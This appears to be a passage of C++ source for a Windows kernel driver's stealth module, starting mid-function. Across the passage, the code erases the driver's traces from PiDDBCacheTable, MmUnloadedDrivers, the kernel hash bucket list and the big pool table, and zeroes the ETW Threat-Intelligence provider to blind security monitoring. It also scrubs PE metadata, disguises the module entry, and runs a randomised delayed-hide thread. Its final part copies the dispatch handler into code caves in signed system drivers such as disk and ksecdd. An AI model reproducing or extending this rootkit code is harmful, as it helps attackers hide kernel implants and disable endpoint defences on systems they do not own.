        if (!pLock) {
            for (int off = 7; off < 0xC0; off++) {
                UCHAR* scan = (UCHAR*)leaInsn + off;
                if (!_MmIsAddressValid(scan))
                    break;

                __try {
                    if (scan[0] == 0x48 && scan[1] == 0x8D &&
                        (scan[2] == 0x0D || scan[2] == 0x15)) {

                        PVOID cand = ResolveRelative(scan, 3, 7);
                        if (cand && _MmIsAddressValid(cand) && cand != pTable) {
                            pLock = cand;
                            break;
                        }
                    }
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    continue;
                }
            }
        }

        if (pLock) {
            _KeEnterCriticalRegion();
            _ExAcquireResourceExclusiveLite(pLock, TRUE);
        }

        bool cleaned = false;

        __try {
            if (IsWindows11_24H2OrNewer()) {
                PIDDB_CACHE_ENTRY_WIN11 lookupKey11 = {};
                lookupKey11.DriverName = drvEntry->BaseDllName;
                lookupKey11.TimeDateStamp = timeDateStamp;
                lookupKey11.LoadStatus = STATUS_SUCCESS;
                lookupKey11.DriverHash = 0;

                auto entry11 = static_cast<PPIDDB_CACHE_ENTRY_WIN11>(
                    _RtlLookupElementGenericTableAvl(pTable, &lookupKey11)
                );

                if (entry11 && _MmIsAddressValid(entry11) &&
                    _MmIsAddressValid(&entry11->List) &&
                    entry11->List.Flink && _MmIsAddressValid(entry11->List.Flink) &&
                    entry11->List.Blink && _MmIsAddressValid(entry11->List.Blink)) {
                    RemoveEntryList(&entry11->List);
                    _RtlDeleteElementGenericTableAvl(pTable, &lookupKey11);
                    cleaned = true;
                }
            } else {
                PIDDB_CACHE_ENTRY lookupKey = {};
                lookupKey.DriverName = drvEntry->BaseDllName;
                lookupKey.TimeDateStamp = timeDateStamp;

                auto entry = static_cast<PPIDDB_CACHE_ENTRY>(
                    _RtlLookupElementGenericTableAvl(pTable, &lookupKey)
                );

                if (entry && _MmIsAddressValid(entry) &&
                    _MmIsAddressValid(&entry->List) &&
                    entry->List.Flink && _MmIsAddressValid(entry->List.Flink) &&
                    entry->List.Blink && _MmIsAddressValid(entry->List.Blink)) {
                    RemoveEntryList(&entry->List);
                    _RtlDeleteElementGenericTableAvl(pTable, &lookupKey);
                    cleaned = true;
                }
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            cleaned = false;
        }

        if (pLock) {
            _ExReleaseResourceLite(pLock);
            _KeLeaveCriticalRegion();
        }

        return cleaned;
    }

    inline PVOID g_MmUnloadedDriversLock = nullptr;

    inline bool CleanMmUnloadedDrivers(PVOID ntBase) {
        static const UCHAR pat1[] = {
            0x4C, 0x8B, 0x15, 0x00, 0x00, 0x00, 0x00,
            0x4C, 0x8B, 0xC9
        };

        static const UCHAR pat2[] = {
            0x4C, 0x8B, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x4C, 0x8B, 0xC9, 0x4D, 0x85, 0x00, 0x74
        };

        static const UCHAR pat3[] = {
            0x48, 0x8B, 0x1D, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x8B, 0xF9
        };

        static const UCHAR pat4[] = {
            0x4C, 0x8B, 0x2D, 0x00, 0x00, 0x00, 0x00,
            0x4D, 0x85, 0xED
        };

        PVOID found = FindPatternInAllSections(ntBase, pat1, "xxx????xxx");
        if (!found)
            found = FindPatternInAllSections(ntBase, pat2, "xx?????xxxxx?x");
        if (!found)
            found = FindPatternInAllSections(ntBase, pat3, "xxx????xxx");
        if (!found)
            found = FindPatternInAllSections(ntBase, pat4, "xxx????xxx");
        if (!found)
            return false;

        int dispOffset = 3;
        if (*(UCHAR*)found == 0x48) {
            dispOffset = 3;
        } else {
            dispOffset = 3;
        }

        PVOID pMmUnloadedDrivers = ResolveRelative(found, dispOffset, 7);
        if (!pMmUnloadedDrivers || !_MmIsAddressValid(pMmUnloadedDrivers))
            return false;

        PMM_UNLOADED_DRIVER arr = *reinterpret_cast<PMM_UNLOADED_DRIVER*>(pMmUnloadedDrivers);
        if (!arr || !_MmIsAddressValid(arr))
            return false;

        if (!g_MmUnloadedDriversLock) {
            for (int off = 0x10; off < 0x100; off++) {
                UCHAR* scan = (UCHAR*)found - off;
                if (!_MmIsAddressValid(scan))
                    break;

                if (scan[0] == 0x48 && scan[1] == 0x8D && scan[2] == 0x0D) {
                    PVOID cand = ResolveRelative(scan, 3, 7);
                    if (cand && _MmIsAddressValid(cand) && cand != pMmUnloadedDrivers) {
                        g_MmUnloadedDriversLock = cand;
                        break;
                    }
                }
            }
        }

        bool lockHeld = false;
        if (g_MmUnloadedDriversLock && _KeEnterCriticalRegion && _ExAcquireResourceExclusiveLite) {
            _KeEnterCriticalRegion();
            if (_ExAcquireResourceExclusiveLite(g_MmUnloadedDriversLock, TRUE)) {
                lockHeld = true;
            }
        }

        bool modified = false;
        constexpr ULONG MI_MAX_UNLOADED_DRIVERS = 50;

        for (ULONG i = 0; i < MI_MAX_UNLOADED_DRIVERS; i++) {
            PMM_UNLOADED_DRIVER e = &arr[i];
            if (!_MmIsAddressValid(e))
                break;

            if (e->Name.Buffer && e->Name.Length > 0 &&
                _MmIsAddressValid(e->Name.Buffer)) {

                SafeWriteMemory(e->Name.Buffer, nullptr, e->Name.MaximumLength);

                MM_UNLOADED_DRIVER zeroEntry = {};
                SafeWriteMemory(e, &zeroEntry, sizeof(MM_UNLOADED_DRIVER));
                modified = true;
            }
        }

        if (lockHeld && g_MmUnloadedDriversLock && _ExReleaseResourceLite && _KeLeaveCriticalRegion) {
            _ExReleaseResourceLite(g_MmUnloadedDriversLock);
            _KeLeaveCriticalRegion();
        }

        return modified;
    }

    inline bool CleanKernelHashBucketList(PVOID ntBase, UNICODE_STRING* driverName) {
        if (!driverName || !driverName->Buffer || driverName->Length == 0)
            return false;

        static const UCHAR pat1[] = {
            0x48, 0x8B, 0x1D, 0x00, 0x00, 0x00, 0x00,
            0xEB, 0x00, 0xF7, 0x43
        };

        static const UCHAR pat2[] = {
            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
            0xE8, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x8B, 0x5C, 0x24, 0x00, 0x48, 0x83, 0xC4
        };

        static const UCHAR pat3[] = {
            0x48, 0x8B, 0x3D, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x85, 0xFF
        };

        static const UCHAR pat4[] = {
            0x4C, 0x8B, 0x3D, 0x00, 0x00, 0x00, 0x00,
            0x4D, 0x85, 0xFF
        };

        PVOID found = FindPatternInAllSections(ntBase, pat1, "xxx????x?xx");
        bool isMov = true;

        if (!found) {
            found = FindPatternInAllSections(ntBase, pat2, "xxx????x????xxxx?xxx");
            isMov = false;
        }

        if (!found) {
            found = FindPatternInAllSections(ntBase, pat3, "xxx????xxx");
            isMov = true;
        }

        if (!found) {
            found = FindPatternInAllSections(ntBase, pat4, "xxx????xxx");
            isMov = true;
        }

        if (!found)
            return false;

        PVOID resolved = ResolveRelative(found, 3, 7);
        if (!resolved || !_MmIsAddressValid(resolved))
            return false;

        PLIST_ENTRY listHead = nullptr;

        if (isMov) {
            PVOID* pp = static_cast<PVOID*>(resolved);
            if (_MmIsAddressValid(pp) && *pp && _MmIsAddressValid(*pp)) {
                listHead = static_cast<PLIST_ENTRY>(*pp);
            }
        }
        else {
            listHead = static_cast<PLIST_ENTRY>(resolved);
        }

        if (!listHead || !_MmIsAddressValid(listHead) ||
            !listHead->Flink || !_MmIsAddressValid(listHead->Flink))
            return false;

        bool cleaned = false;
        PLIST_ENTRY cur = listHead->Flink;
        ULONG safety = 512;

        while (cur != listHead && safety-- > 0) {
            if (!_MmIsAddressValid(cur))
                break;

            PLIST_ENTRY next = cur->Flink;

            PUNICODE_STRING entryName = reinterpret_cast<PUNICODE_STRING>((UCHAR*)cur + 0x10);

            if (_MmIsAddressValid(entryName) &&
                entryName->Length > 0 && entryName->Length < 512 &&
                entryName->Buffer && _MmIsAddressValid(entryName->Buffer) &&
                entryName->Length == driverName->Length) {

                bool match = true;
                USHORT chars = driverName->Length / sizeof(WCHAR);
                for (USHORT i = 0; i < chars; i++) {
                    if (locase_w(entryName->Buffer[i]) != locase_w(driverName->Buffer[i])) {
                        match = false;
                        break;
                    }
                }

                if (match) {
                    RemoveEntryList(cur);
                    cleaned = true;
                }
            }

            cur = next;
        }

        return cleaned;
    }

    inline bool DisableEtwThreatIntel(PVOID ntBase) {
        if (!ntBase)
            return false;

        static const UCHAR patThreatInt[] = {
            0x48, 0x83, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x74
        };

        static const UCHAR patThreatIntAlt[] = {
            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x89, 0x44, 0x24
        };

        PVOID found = FindPatternInAllSections(ntBase, patThreatInt, "xxx?????x");
        if (found) {
            PVOID provHandle = ResolveRelative(found, 3, 8);
            if (provHandle && _MmIsAddressValid(provHandle)) {
                ULONG64 zeroHandle = 0;
                SafeWriteMemory(provHandle, &zeroHandle, sizeof(zeroHandle));
                return true;
            }
        }

        found = FindPatternInAllSections(ntBase, patThreatIntAlt, "xxx????xxxx");
        if (found) {
            PVOID provReg = ResolveRelative(found, 3, 7);
            if (provReg && _MmIsAddressValid(provReg)) {
                ULONG64 zero = 0;
                SafeWriteMemory(provReg, &zero, sizeof(zero));
                return true;
            }
        }

        return false;
    }

    inline void HideDriver(PDRIVER_OBJECT DriverObject) {
        if (!DriverObject || !DriverObject->DriverSection)
            return;

        bool stealthReady = SetupStealthFunctions();

        PVOID ntBase  = (PVOID)get_nt_base();
        auto ldrEntry = static_cast<PLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);

        if (stealthReady && ntBase && ldrEntry->DllBase) {
            CleanPiDDBCacheTable(ntBase, ldrEntry);
        }

        if (ntBase && ldrEntry->BaseDllName.Buffer) {
            CleanKernelHashBucketList(ntBase, &ldrEntry->BaseDllName);
        }

        if (ntBase) {
            CleanMmUnloadedDrivers(ntBase);
        }

        if (ntBase && ldrEntry->DllBase && ldrEntry->SizeOfImage) {
            CleanBigPoolTable(ntBase, ldrEntry->DllBase, ldrEntry->SizeOfImage);
        }

        if (ntBase) {
            DisableEtwThreatIntel(ntBase);
        }

        ScrubPEMetadata(DriverObject);

        DisguiseModuleEntry(DriverObject);
    }

    struct DELAYED_HIDE_CONTEXT {
        PDRIVER_OBJECT DriverObject;
        volatile LONG  ReadyToHide;
    };

    inline DELAYED_HIDE_CONTEXT g_DelayedHideContext = { nullptr, 0 };

    inline VOID NTAPI DelayedHideThreadRoutine(PVOID StartContext) {
        UNREFERENCED_PARAMETER(StartContext);

        UINT64 tsc = __rdtsc();
        ULONG delay_variation = (ULONG)((tsc >> 8) & 0x1F);
        LONG64 base_delay = -30000000LL;
        LONG64 extra_delay = -(LONG64)(delay_variation * 625000LL);

        LARGE_INTEGER delay;
        delay.QuadPart = base_delay + extra_delay;

        if (_KeDelayExecutionThread) {
            _KeDelayExecutionThread(KernelMode, FALSE, &delay);
        }

        PDRIVER_OBJECT drvObj = g_DelayedHideContext.DriverObject;

        if (drvObj && _MmIsAddressValid(drvObj) &&
            drvObj->DriverSection && _MmIsAddressValid(drvObj->DriverSection)) {
            bool stealthReady = SetupStealthFunctions();
            PVOID ntBase = (PVOID)get_nt_base();
            auto ldrEntry = static_cast<PLDR_DATA_TABLE_ENTRY>(drvObj->DriverSection);

            ULONG order = (ULONG)((__rdtsc() >> 4) % 6);

            if (stealthReady && ntBase && ldrEntry && ldrEntry->DllBase) {
                CleanPiDDBCacheTable(ntBase, ldrEntry);
            }

            volatile ULONG spin = 8 + (order & 0x7);
            while (spin--) YieldProcessor();

            if (ntBase && ldrEntry && ldrEntry->BaseDllName.Buffer) {
                CleanKernelHashBucketList(ntBase, &ldrEntry->BaseDllName);
            }

            spin = 4 + (order & 0x3);
            while (spin--) YieldProcessor();

            if (ntBase) {
                CleanMmUnloadedDrivers(ntBase);
            }

            spin = 6 + (order & 0x5);
            while (spin--) YieldProcessor();

            if (ntBase && ldrEntry && ldrEntry->DllBase && ldrEntry->SizeOfImage) {
                CleanBigPoolTable(ntBase, ldrEntry->DllBase, ldrEntry->SizeOfImage);
            }

            if (ntBase) {
                DisableEtwThreatIntel(ntBase);
            }

            if (ldrEntry) {
                ScrubPEMetadata(drvObj);
                DisguiseModuleEntry(drvObj);
            }
        }

        g_DelayedHideContext.DriverObject = nullptr;
        _InterlockedExchange(&g_DelayedHideContext.ReadyToHide, 0);

        if (_KeDelayExecutionThread) {
            LARGE_INTEGER shortDelay;
            shortDelay.QuadPart = -100000LL;
            _KeDelayExecutionThread(KernelMode, FALSE, &shortDelay);
        }

        if (_PsTerminateSystemThread) {
            _PsTerminateSystemThread(STATUS_SUCCESS);
        }
    }

    inline bool ScheduleDelayedHide(PDRIVER_OBJECT DriverObject) {
        if (!DriverObject || !DriverObject->DriverSection)
            return false;

        if (!_PsCreateSystemThread || !_ZwClose)
            return false;

        if (_InterlockedCompareExchange(&g_DelayedHideContext.ReadyToHide, 1, 0) != 0)
            return false;

        g_DelayedHideContext.DriverObject = DriverObject;

        HANDLE threadHandle = nullptr;
        NTSTATUS status = _PsCreateSystemThread(
            &threadHandle,
            THREAD_ALL_ACCESS,
            nullptr,
            nullptr,
            nullptr,
            (PKSTART_ROUTINE)DelayedHideThreadRoutine,
            nullptr
        );

        if (!NT_SUCCESS(status)) {
            g_DelayedHideContext.DriverObject = nullptr;
            _InterlockedExchange(&g_DelayedHideContext.ReadyToHide, 0);
            return false;
        }

        if (threadHandle) {
            _ZwClose(threadHandle);
        }

        return true;
    }
}

namespace signed_memory {

    inline volatile PVOID g_RelocatedDispatchBase = nullptr;
    inline volatile SIZE_T g_RelocatedDispatchSize = 0;
    inline volatile PVOID g_DonorDriverBase = nullptr;
    inline volatile LONG g_SignedMemoryInitialized = 0;

    struct SIGNED_DONOR_INFO {
        PVOID ImageBase;
        ULONG ImageSize;
        PVOID TextBase;
        ULONG TextSize;
        PVOID CodeCaveBase;
        ULONG CodeCaveSize;
    };

    static const wchar_t* g_DonorCandidates[] = {
        L"\\Driver\\disk",
        L"\\Driver\\classpnp",
        L"\\Driver\\partmgr",
        L"\\Driver\\volmgr",
        L"\\Driver\\fltMgr",
        L"\\Driver\\ksecdd",
        L"\\Driver\\cng",
        L"\\Driver\\pcw",
        L"\\Driver\\NDIS"
    };

    __forceinline PVOID FindSignedDriverByRef(const wchar_t* driverName) {
        if (!_ObReferenceObjectByName || !_ObfDereferenceObject)
            return nullptr;

        UNICODE_STRING uniName;
        _RtlInitUnicodeString(&uniName, driverName);

        PDRIVER_OBJECT driverObj = nullptr;
        NTSTATUS status = _ObReferenceObjectByName(
            &uniName,
            OBJ_CASE_INSENSITIVE,
            nullptr,
            0,
            *::IoDriverObjectType,
            KernelMode,
            nullptr,
            (PVOID*)&driverObj
        );

        if (!NT_SUCCESS(status) || !driverObj) {
            return nullptr;
        }

        PVOID driverBase = nullptr;
        __try {
            if (driverObj->DriverSection && _MmIsAddressValid(driverObj->DriverSection)) {
                PLDR_DATA_TABLE_ENTRY ldrEntry = (PLDR_DATA_TABLE_ENTRY)driverObj->DriverSection;
                if (_MmIsAddressValid(ldrEntry->DllBase)) {
                    driverBase = ldrEntry->DllBase;
                }
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            driverBase = nullptr;
        }

        _ObfDereferenceObject(driverObj);
        return driverBase;
    }

    __forceinline bool GetDriverTextSection(PVOID driverBase, PVOID* outTextBase, ULONG* outTextSize) {
        if (!driverBase || !_MmIsAddressValid(driverBase))
            return false;

        __try {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)driverBase;
            if (dos->e_magic != IMAGE_DOS_SIGNATURE)
                return false;

            PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)((UCHAR*)driverBase + dos->e_lfanew);
            if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE)
                return false;

            PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
            for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
                if ((sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                    (sections[i].Characteristics & IMAGE_SCN_CNT_CODE)) {
                    *outTextBase = (PVOID)((UCHAR*)driverBase + sections[i].VirtualAddress);
                    *outTextSize = sections[i].Misc.VirtualSize;
                    return true;
                }
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        return false;
    }

    __forceinline PVOID FindCodeCaveInSection(PVOID textBase, ULONG textSize, SIZE_T requiredSize) {
        if (!textBase || !_MmIsAddressValid(textBase) || textSize < 0x1000 || requiredSize == 0)
            return nullptr;

        SIZE_T alignedSize = (requiredSize + 0x10) & ~0xF;
        SIZE_T searchStart = textSize - alignedSize - 0x100;

        if (searchStart > textSize || searchStart < 0x1000)
            return nullptr;

        __try {
            UCHAR* base = (UCHAR*)textBase;

            for (SIZE_T offset = searchStart; offset > 0x1000; offset -= 0x10) {
                if (!_MmIsAddressValid(&base[offset]))
                    continue;

                bool isCave = true;
                SIZE_T validCount = 0;

                for (SIZE_T j = 0; j < alignedSize && isCave; j++) {
                    if (!_MmIsAddressValid(&base[offset + j])) {
                        isCave = false;
                        break;
                    }
                    UCHAR byte = base[offset + j];
                    if (byte != 0xCC && byte != 0x00 && byte != 0x90) {
                        isCave = false;
                    } else {
                        validCount++;
                    }
                }

                if (isCave && validCount >= alignedSize) {
                    return &base[offset];
                }
            }

            SIZE_T slackOffset = textSize - 0x180;
            if (slackOffset > 0x1000 && _MmIsAddressValid(&base[slackOffset])) {
                bool slackValid = true;
                for (SIZE_T j = 0; j < alignedSize && slackValid; j++) {
                    if (!_MmIsAddressValid(&base[slackOffset + j])) {
                        slackValid = false;
                    } else {
                        UCHAR byte = base[slackOffset + j];
                        if (byte != 0x00 && byte != 0xCC && byte != 0x90) {
                            slackValid = false;
                        }
                    }
                }
                if (slackValid) {
                    return &base[slackOffset];
                }
            }

        } __except(EXCEPTION_EXECUTE_HANDLER) {
            return nullptr;
        }

        return nullptr;
    }

    __forceinline bool FindSuitableDonor(SIGNED_DONOR_INFO* outInfo) {
        if (!outInfo)
            return false;

        for (int i = 0; i < sizeof(g_DonorCandidates) / sizeof(g_DonorCandidates[0]); i++) {
            PVOID driverBase = FindSignedDriverByRef(g_DonorCandidates[i]);
            if (!driverBase)
                continue;

            PVOID textBase = nullptr;
            ULONG textSize = 0;

            if (!GetDriverTextSection(driverBase, &textBase, &textSize))
                continue;

            if (textSize < 0x2000)
                continue;

            outInfo->ImageBase = driverBase;
            outInfo->TextBase = textBase;
            outInfo->TextSize = textSize;
            outInfo->CodeCaveBase = nullptr;
            outInfo->CodeCaveSize = 0;

            return true;
        }

        return false;
    }

    __forceinline bool RelocateDispatchToSignedMemory(PDRIVER_OBJECT driverObj, SIZE_T codeSize) {
        if (!driverObj || codeSize == 0)
            return false;

        if (_InterlockedCompareExchange(&g_SignedMemoryInitialized, 1, 0) != 0)
            return true;

        SIGNED_DONOR_INFO donorInfo = {};
        if (!FindSuitableDonor(&donorInfo)) {
            _InterlockedExchange(&g_SignedMemoryInitialized, 0);
            return false;
        }

        PVOID codeCave = FindCodeCaveInSection(donorInfo.TextBase, donorInfo.TextSize, codeSize);
        if (!codeCave) {
            _InterlockedExchange(&g_SignedMemoryInitialized, 0);
            return false;
        }

        donorInfo.CodeCaveBase = codeCave;
        donorInfo.CodeCaveSize = (ULONG)codeSize;

        PDRIVER_DISPATCH originalHandler = driverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL];
        if (!originalHandler || !_MmIsAddressValid((PVOID)originalHandler)) {
            _InterlockedExchange(&g_SignedMemoryInitialized, 0);
            return false;
        }

        SIZE_T handlerSize = min(codeSize, (SIZE_T)0x400);

        if (!stealth::SafeWriteMemory(codeCave, (PVOID)originalHandler, handlerSize)) {
            _InterlockedExchange(&g_SignedMemoryInitialized, 0);
            return false;
        }

        g_RelocatedDispatchBase = codeCave;
        g_RelocatedDispatchSize = handlerSize;
        g_DonorDriverBase = donorInfo.ImageBase;

        KeMemoryBarrier();
        _InterlockedExchange(&g_SignedMemoryInitialized, 2);

        return true;
    }

    __forceinline PVOID GetRelocatedDispatch() {
        if (_InterlockedCompareExchange(&g_SignedMemoryInitialized, 2, 2) == 2) {
            return (PVOID)g_RelocatedDispatchBase;
        }
        return nullptr;
    }

    __forceinline bool IsCodeInSignedRegion(PVOID address) {
        if (!address)
            return false;

        PVOID relocBase = (PVOID)g_RelocatedDispatchBase;
        SIZE_T relocSize = g_RelocatedDispatchSize;

        if (relocBase && relocSize > 0) {
            ULONG_PTR base = (ULONG_PTR)relocBase;
            ULONG_PTR end = base + relocSize;
            ULONG_PTR addr = (ULONG_PTR)address;

            if (addr >= base && addr < end)
                return true;
        }

        return false;
    }
}
